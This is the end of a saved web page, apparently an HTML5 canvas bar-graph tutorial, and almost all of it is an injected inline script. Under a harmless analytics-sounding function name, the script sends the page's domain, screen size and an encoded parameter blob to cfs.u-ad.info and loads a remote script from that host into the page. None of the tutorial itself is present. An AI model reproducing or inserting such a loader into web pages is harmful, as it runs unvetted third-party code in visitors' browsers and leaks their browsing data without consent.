<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRk3cX4VkP2IMuDtf6zJVt16xCrlvtJbH5yFoQtvfbU9cqzBZ8KDjdgmaz1Jv7X1StsSy5WKhgiEdRqusiBKYebnbG2Kn2f1V%2fTvs7mc5P1En01rt4yw8kiv9b55LD5HPliO%2fpjOTxx5nZe7F%2bq5SbAfll1D2Ns0s3MDuflcRXtoxlKcm69dwWP%2bROaI3VHcYQaWwdn8bmes6VJpqMDllyVS4trvLbHfHfCD4u0E9LP9fuYuaqcHJAGTI8YglHArwUCSoaTY5BCGUvDqsz0G5opNZVaTTbM%2fg7kTbRR%2fz9jobVBb%2b2RpXiJne6KIoez9BmMWJ8KLMA7sAAucoyILuKNU%2fn0duvPZjSyyNBbzkjNDfiDwF2NGJt8Y7lNVkMJnmaE1jt8pIq3rh1oglKE12qjtSHsS6lW%2fwiMyDFUFfB4sE%2bKqQiOzMp6a5ef32N3ARvLdokiqYbrBUhq1x2zJViYPbfLP%2bodR1W3RN6GYSfB64QNPLzhNK7KkQt%2bdt6YUewlSoUzmQX%2f4c7GOOqg5NeSOhL6upbDR8jhhuVDT%2fi1APXyWNLrEPyyUVQQMODFEgha57N%2fsmj7yVvzdcLwhCQGYXw9GLcLPoF06CG9S16T01y4EMCSglWXZ1LtpTJiWkq0ki5lJob3k%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>




                
</div><script async="" src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/main.js"></script><script async="" src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/javascript.js"></script></body></html>